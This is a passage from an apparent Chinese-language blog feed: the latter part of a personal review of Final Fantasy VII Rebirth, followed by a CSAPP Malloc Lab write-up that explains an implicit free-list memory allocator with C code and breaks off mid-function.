令与动作边界。如今，大部分的敌人攻击都可以依靠闪避或完美防御来化解，战斗手感更加顺畅。值得一提的是，《重生》的完美防御在（被）打击反馈上做的很好，一旦触发，正反馈极强。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/menu.jpg" alt></p><p>联手技算是一个全新的机制，它相当于给战斗系统引入了另外一个维度的资源，给战斗增添了更多的不确定性。在本作的战斗体系下，全员低血量且无 ATB 积攒的情况是十分危险的，玩家要想恢复生命值，就必须向敌人发起攻击以累积 ATB，而在低血量的情况下贸然攻击敌人又很可能导致角色死亡，让战斗局势更加难以挽回，而联手技配合原有的极限技，让玩家在这种情况下多了一份逆风翻盘的可能性。制作组可能是为了尽可能强化这种体验，这一作的战斗明显节奏上更快，而且也更加危险，Normal 难度在同类游戏中绝对算不上低，我数不清有多少次，在全员生命值告急的情况下，坚持一顿连续输出，将 boss 一波带走。这样的战斗体验，可谓十分美妙。</p><p>有关战斗这部分我也没法聊的太多，因为我短短 87 小时的游戏时长，也不太可能把《重生》的战斗玩得很明白。实际上，我玩得算是比较草率，7 个可控角色中，除却强制配队的情况，我基本全程都是克劳德、蒂法和爱丽丝的组合，魔晶石搭配、装备、魔导书等系统也基本只仔细研究了他们三人。但即便如此，综合战斗的乐趣和深度而言，《重生》的这套既复古又现代的战斗系统，也足以在我玩过的 jrpg 中位居第一。</p><h1 id="演出如诗，旋律如泣"><a href="#演出如诗，旋律如泣" class="headerlink" title="演出如诗，旋律如泣"></a>演出如诗，旋律如泣</h1><p>《重生》的画面表现，是让我比较感到比较失望的点，尤其是在引入了大地图之后，暴露了诸多技术性的问题。</p><p>首先是光影，前作的光影效果给我留下了很深刻的印象，可以说在当时来讲非常出色，尤其是游戏序章炸毁魔晄炉的任务中，光影层次丰富，氛围营造极为出色。要知道，我当时可是在一台性能已经被如今的旗舰手机赶超的 PS4 Slim 上游玩的。但在《重生》中，虽然固定的室内场景还算比较出色，但一旦涉及到室内外切换，光影调整往往迟滞数秒，甚至从室内看向室外，时常出现过曝现象，出口处白茫茫的一片什么也看不见，体验十分糟糕。此外，在非 Pro 版 PS5 上，性能模式（60 FPS）下画面呈现非常模糊，但根据数毛社 Digital Foundry 的评测，该模式下实际的渲染分辨率并不低，大约在 1100p 上下浮动，貌似是没有用上现代的超分辨率技术的缘故，使得画面观感很差。为了更好地体验故事，我后面还是选择全程开着画面模式（30 FPS）来游玩，至少在这个模式下，综合画面质量相比上一作还是有显著进步的。</p><p>虽然画面硬素质很一般，但是场景美术依然可圈可点。尤其是第一张大地图——格拉斯兰地区，场景色调以浅色系为主，营造出极为舒适的视觉观感，这种风格很像另一个我很喜欢的 jrpg ——《最终幻想 15》，其温暖而富有生机的奇幻色彩，正是我心目中理想的日式奇幻世界该有的样子。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/castle.jpg" alt></p><p>要说起《最终幻想》这个 IP 所最不容妥协的，玩家也最不用担心搞砸的是什么，恐怕大部分人都会给出同一个答案，那就是音画表现，更具体来说——演出与音乐。《最终幻想》系列对演出效果的追求是十分偏执的，在如今这个即时演算动画效果已经非常出色，绝大部分游戏厂商都完全放弃了采用预渲染 CG 的情况下，《最终幻想》依然执着地在关键剧情中插入 CG 过场，用以将某些场景的表现力推至极致。这种对演出的极端追求，或许正是《最终幻想》系列的“基因”吧。而本作亦是如此，奉献了很多注定会在系列历史上，乃至整个电子游戏史上留下浓墨重彩一笔的精彩演出。</p><p>《重生》在音乐上交出的答卷也是十分令人满意的，游戏在每张大地图都配备了探索与战斗两套不同编曲的配乐，以便在游玩过程中无缝切换。再结合前面提到的优秀场景美术，使得游戏的清单项清理过程变得不再那么枯燥，至少在前期，体验可以说相当出色。音乐上的“铺张浪费”也是显而易见的，游戏中有很多根本无关紧要的支线任务，甚至是小游戏，都配备了专属 BGM。我脑海中立马能浮现的例子，就有一个青蛙跳台小游戏和一个护送狗的支线任务，当时玩到可谓是大受震撼。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/loveless.jpg" alt></p><p>音乐在关键情节的演绎也是极其出色的，《重生》这一部剧情的绝对核心是爱丽丝，因为终章大概率没有多少她的戏份了，因此这一作花了大量的篇幅对她进行塑造，希望给这个角色一个完美的“退场仪式”。这一点从音乐上也能看出来，《重生》这一作编写了大量爱丽丝主题曲的不同变奏版本，分别在各个与之相关的情节播放，比如星陨峡谷的送星仪式，还有古代种神殿中爱丽丝的幼年回忆等，甚至本作的主题曲——《No promises to keep》都是为她量身打造，并奉上了一段极其精彩的演出。这些铺垫在最终章时得到爆发，爱丽丝之死，以及随后紧接的 boss 战，音乐的情绪渲染堪称教科书级别，将玩家的情绪推向极致。</p><h1 id="命运交错，情感升华"><a href="#命运交错，情感升华" class="headerlink" title="命运交错，情感升华"></a>命运交错，情感升华</h1><p>在开坑《重生》前，我特地花了 30 多小时重温了四年前的重制版一代。在称赞前作优秀战斗系统的同时，也感受到一些叙事上存在的问题，而《重生》这一代甚至将这些问题进一步放大。</p><p>直观感受就是部分情节的呈现显得突兀甚至略显尴尬。个人总结其中一个很大的原因是重制所带来的：97 年原版的《最终幻想 7》虽在当前感动了无数玩家，但在那个 3d 技术尚未成熟的年代，除 CG 过场外，角色的剧情演出基本都是由 q 版小人以较为抽象的方式来表现。如今，制作组试图将这些情节用现代图形技术加持的影视化方式进行重塑，难免会感到很不协调。虽然制作组已经为此优化了很多，但问题依然存在。另外，可能是为了提升游戏体验的丰富度，在我看来 gameplay 在本作中应当占据了较大的话语权，很多不太合理的故事情节实际上是为了引出一些小游戏供玩家体验，而这其中很大一部分其实是原作就有的。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/gold.jpg" alt></p><p>但是尽管如此，《重生》剧情体验的优点也完美继承自上一作，并且同样也得到了提升，那就是人物塑造和细腻的情感刻画。《最终幻想 7》的重制三部曲（虽说最后一部还没出）之所以能做好这部分，其实很大程度上也是因为重制的缘故，当原版可能几个小时的流程被扩展成为一个三四十小时的完整体量游戏时，角色一些可能无关紧要的行为就能有充足的空间被细致刻画。而这些被塑造的十分丰满、富有魅力的角色，也正是我喜欢《最终幻想 7》的原因，同时也是我如此在意它后续故事发展的原因。这一次开坑《重生》的过程，就像是与阔别数年的老朋友重逢，主角团之间产生的一些有趣的互动，为整个冒险旅程注入了独特的温度，很大程度上掩盖了上面提到的一些情节上的瑕疵。仔细想想，这大概也是我热爱 jrpg 的原因吧。</p><p>最后，我想好好聊聊《重生》最后的结局。这个结局带给我的感受是十分复杂的。</p><p>首先，不考虑制作组真正想整的大活，仅从观感来看，情节的演绎方式让我一度感到诧异，甚至是愤怒，这部分最突出的地方莫过于大 boss——萨菲罗斯的各种演出。若要问我《重生》中最讨厌的角色，那非萨菲罗斯莫属了。这个角色在情节中的插入，几乎充斥着整部游戏，虽说这与原版《最终幻想 7》故事精华之一——主角克劳德过去的经历密切相关，但在我看来制作组显然没有把控好这个度，让我感到厌烦，尤其在结局处更加放大了这一感受。</p><p>但是另一方面，原版《最终幻想 7》最令人印象深刻的情节——爱丽丝之死使用了一种完全不一样的方式来呈现，这部分的呈现效果非常因人而异。在我的观察下，不同人对剧情的理解不同，可能会得到截然不同的感受。而在我的理解下，至少是我当时得出的结论来说：爱丽丝之死的结果并没有被改变。因此这段情节对我的情感冲击很大，随后的 boss 战更是将整段演出进行升华，杰诺瓦 boss 战的音乐与爱丽丝的主题曲相互交织，带给我近两年从游戏中收获的最大的感动。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/aerith.jpg" alt></p><blockquote><p>关于我得出爱丽丝之死没有被改变的结论的原因，一方面是此前采访中制作人滨口直树提到的“一些关键角色的死亡不会被改变，而会以另一种方式来呈现”；另一方面是其实更多的是直觉——或许是我的期待，或许是我的理解。</p></blockquote><p>而在其他一些玩家的体验中，可能得出爱丽丝的结局将被改变，或是还处在对前面引入的平行宇宙设定感到迷惑的阶段，在这一刻下理性思维盖过了感性思维，因此情感并没有被成功调动。因此，结局所带来的冲击力因人而异，或感动，或困惑，或不满。</p><p>至于结局处留下的更多伏笔，网上的讨论有很多，我也对参与其中也并无兴趣，只希望制作组妥善处理，在终章尽可能将这些坑填上，给这场历经数年的冒险旅途画上一个圆满的句号。</p><p>现在的我，已经无比期待终章的发售，不出意外，它应该是我 27 年最期待的游戏了（立个 flag，希望 27 年能出 😭）。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/end.jpg" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;《最终幻想7：重生》是我 2024 年最期待的游戏之一。由于发售时还没有 PS5，加上考研复试等事务缠身，没能第一时间体验。后来，后面为了剧情体验的连贯性，我又重温了一遍四年前的《最终幻想7：重制版》，直到最近两个月才正式开坑。&lt;/p&gt;
&lt;p&gt;历经 87 小时通关一周目后，</summary>
      
    
    
    
    <category term="游戏" scheme="http://lordaeronesz.github.io/categories/%E6%B8%B8%E6%88%8F/"/>
    
    
    <category term="游戏" scheme="http://lordaeronesz.github.io/tags/%E6%B8%B8%E6%88%8F/"/>
    
    <category term="闲谈" scheme="http://lordaeronesz.github.io/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Malloc Lab</title>
    <link href="http://lordaeronesz.github.io/2025/01/10/CSAPP-Malloc-Lab/"/>
    <id>http://lordaeronesz.github.io/2025/01/10/CSAPP-Malloc-Lab/</id>
    <published>2025-01-10T03:45:11.000Z</published>
    <updated>2025-01-11T02:24:55.025Z</updated>
    
    <content type="html"><![CDATA[<p>本 Lab 需要实现一个内存分配器，技巧性较强，对应知识点为书中的第 9 章的第 9.9 节。个人认为是所有 Lab 中难度最高的一个，我这里也是时间所迫，只参照教材实现了隐式空闲链表，显式空闲链表的实现尚存在一些 bug，在本文暂不介绍。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>实现 <code>mm_init</code>, <code>mm_malloc</code>, <code>mm_free</code>, <code>mm_realloc</code>。</p><p><code>mm_malloc</code> 需要返回 8 字节对齐的指针。</p><p><code>mm_realloc</code>: 返回一个指向至少 <code>size</code> 字节的内存区域指针。</p><ul><li>如果 <code>ptr</code> 为空，作用等同于 <code>mm_malloc(size)</code>。</li><li>如果 <code>size</code> 等于 0，作用等用于 <code>mm_free(ptr)</code>。</li><li>如果 <code>ptr</code> 非空，将 <code>ptr</code> 指向区域的大小更改为 <code>size</code> 字节，并返回新区域的内存地址。</li></ul><h2 id="隐式空闲链表"><a href="#隐式空闲链表" class="headerlink" title="隐式空闲链表"></a>隐式空闲链表</h2><p>首先介绍一下书中介绍的隐式空闲链表的设计，主要分为两个方面：空闲块的设计和空闲链表的组织。</p><h3 id="空闲块的设计"><a href="#空闲块的设计" class="headerlink" title="空闲块的设计"></a>空闲块的设计</h3><p><img src="/2025/01/10/CSAPP-Malloc-Lab/bound.png" alt></p><p>一个空闲块由三部分组成：首部、载荷（可能包含填充）和尾部。头部和尾部的内容完全一致，之所以要引入这样的冗余信息，是为了实现常数时间复杂度的反向访问。因为内存载荷大小的不确定性，因此无法直接根据当前内存载荷的地址计算得到前一块的地址，而引入了尾部后，就能够根据固定步长（当前块的首部和上一块的尾部地址差一个字）计算得到前一块载荷的地址。</p><p>另外，首（尾）部的内容也值得一提，由于空闲块需要 8 字节对齐，因此 block size 的低 3 位必定为 0，因此这 3 位的信息是冗余的，可省略，转而将其最低位作为分配位，0 代表空闲，1 代表已分配。</p><h3 id="空闲链表的组织"><a href="#空闲链表的组织" class="headerlink" title="空闲链表的组织"></a>空闲链表的组织</h3><p><img src="/2025/01/10/CSAPP-Malloc-Lab/logue.png" alt></p><p>空闲链表的组织如上图所示，可以看到，常规的内存块两端引入了序言块（prologue block）和结尾块（epilogue block），同时为了保持 8 字节对齐，还在序言块的头部引入了一个 4 字节的 padding 块。</p><p>序言块和结尾块的分配位都标记为 1，之所以要这么做，是为了更方便地处理空闲块合并时的边界条件，它们的作用其实就相当于链表的 dummy 结点。其中，结尾块的大小字段设置为 0，用以唯一地对其进行标记（因为其他块的大小必定大于 0）。</p><h3 id="各函数实现"><a href="#各函数实现" class="headerlink" title="各函数实现"></a>各函数实现</h3><p>由于 <code>mm_init</code>，<code>mm_malloc</code> 等操作书中已经实现且比较易懂，接下来主要介绍 <code>extend_heap</code>，<code>find_fit</code>，<code>place</code> 和 <code>mm_realloc</code>。</p><h4 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a><code>extend_heap</code></h4><p><code>extend_heap</code> 的作用是对堆进行扩展，具体来说是先使用 <code>mm_sbrk</code> 向上增长堆尾指针 <code>mm_brk</code> 的位置，再将新扩展出来的内存块连接到原有块的末尾。</p><p>连接这部分的操作不太易懂，书中也对此做出了解释：</p><blockquote><p>The remainder of the extend<em>heap function (lines 12–17) is somewhat subtle. The heap begins on a double-word aligned boundary, and every call to extend</em> heap returns a block whose size is an integral number of double words. Thus, every call to mem_sbrk returns a double-word aligned chunk of memory immediately following the header of the epilogue block. This header becomes the header of the new free block (line 12), and the last word of the chunk becomes the new epilogue block header (line 14). Finally, in the likely case that the previous heap was terminated by a free block, we call the coalesce function to merge the two free blocks and return the block pointer of the merged blocks (line 17).</p></blockquote><p>简单来说，新扩展出来的块的起始地址即 <code>mm_sbrk(size)</code> 的返回值 <code>bp</code>，它紧挨在原来块的末尾——结尾块的头部，而 <code>PUT(HDRP(bp), PACK(size, 0))</code> 则正好是将其覆盖并作为新块的头部，注意 <code>HDRP</code> 的定义：<code>#define HDRP(bp) ((char *)(bp) - WSIZE)</code>。随后便是创建尾部，并在新块的末尾添加一个新的结尾块，最后尝试将新块与前一块进行合并。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 分配偶数个字来保持字节对齐 </span>    size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token operator">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化空闲块的 header, footer 和下一块的 epilogue</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果前一块是空闲，则合并</span>    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a><code>find_fit</code></h4><p>这部分其实没什么好说的，我只是实现了最简单的首次匹配算法，需要注意的就是根据 size 是否等于 0 来判断当前遍历块是否是结尾块。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 最简单的首次匹配策略</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>blkp <span class="token operator">=</span> heap_listp<span class="token punctuation">;</span>        <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>        blkp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">>=</span> asize <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> blkp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="place"><a href="#place" class="headerlink" title="place"></a><code>place</code></h4><p><code>place</code> 操作通常紧跟在成功查找到空闲块之后执行，作用是将 <code>asize</code> 大小的块”放置在“地址为 <code>bp</code> 的块中。一种最简单朴素的做法当然是将整个块进行完全分配，但是这样会引入大量的内部碎片（internal fragmentation），降低内存的利用率。</p><p>为了改善这一点，需要对块进行分割，书中提到的一种简单的分割策略是：如果分割后剩余的块大小大于等于隐式空闲链表空闲块设计的最小大小（即 8 字节，只包含首部和尾部），则进行分割，否则，整个分配。在代码实现上，分割时只需要分配放置分配块与剩余块的首部和尾部即可。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 空闲块大小</span>    <span class="token class-name">size_t</span> remain <span class="token operator">=</span> size <span class="token operator">-</span> asize<span class="token punctuation">;</span>      <span class="token comment">// 空闲块分配 asize 字节后剩余的空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>remain <span class="token operator">>=</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 不分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a><code>mm_realloc</code></h4><p><code>mm_realloc</code> 作用是调整地址为 <code>ptr</code> 的块大小，另外当 <code>ptr</code> 为空或 <code>size</code> 为 0 时有特殊作用，这部分比较简单，下面只讨论普遍的情况：</p><p>虽说是用户调整块大小，但块大小仍然要保持 8 字节对齐，因此首要工作是计算实际调整后的块大小 <code>asize</code> 的值。随后根据 <code>asize</code> 与原始块的大小 <code>osize</code> 进行比较，根据三种不同情况分别进行处理：</p><ol><li><code>osize == asize</code>：此时不变，返回 <code>ptr</code> 即可。</li><li><code>osize &gt; asize</code>：块进行收缩，需要将其进行分割，回想前面实现的 <code>place</code> 作用正好就是分割块，因此直接调用后返回 <code>ptr</code> 即可。</li><li><code>osize &lt; asize</code>：块进行扩张，有三种解决方式：<ol><li>首先可以尝试合并相邻块，但由于要保证块调整后数据的完整性，因此合并前一块的操作略显麻烦，需要将数据整个进行移动，且同时也会引入额外的时间开销。这里为了实现的简单，只考虑对后一块进行合并，这样就只需要调整首尾块大小，而不需要对内存载荷做任何修改。</li><li>若无可合并的块或合并后块大小仍然不足，则遍历整个空闲链表，找到块大小大于等于 <code>asize</code> 的块，使用 <code>place</code> 对其进行分割，并使用 <code>memcpy</code> 将原始块的数据拷贝至新块中。最后，<strong>极其关键</strong> 的一点，需要将原始块进行释放，否则将会出现内存耗尽的错误，我就忽视了这一点，debug 了很长时间…</li><li>若空闲链表中找不到满足条件的块，则使用 <code>extend_heap</code> 对堆进行扩展，后续的操作与 (2) 相同。</li></ol></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> osize<span class="token punctuation">,</span> asize<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整块大小以对齐</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    osize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">==</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 不变</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">></span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 收缩，进行分割</span>        <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">// 扩张，首先尝试合并相邻块，若相邻块已分配或合并后仍然不够，</span>                                 <span class="token comment">// 则尝试查找新块，若找不到，则进行堆空间的申请</span>        <span class="token comment">// 合并相邻块（简化版：只合并后续块）</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            osize <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token 